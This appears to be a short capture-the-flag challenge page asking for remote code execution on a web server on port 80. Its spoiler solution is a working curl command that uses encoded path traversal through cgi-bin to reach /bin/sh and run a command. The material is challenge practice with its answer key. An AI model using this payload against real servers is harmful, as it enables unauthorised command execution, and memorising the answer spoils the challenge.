<h2>Description</h2>
<p>Find an RCE on this web server running on port 80.</p>

<h2>Goal</h2>
<p>RCE</p>

<h2>Solution</h2>
<details>
    <summary>Spoilers! (click to expand)</summary>
    <p>curl -s --path-as-is -d "echo Content-Type: text/plain; echo; whoami" "http://"localhost"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"</p>
</details>
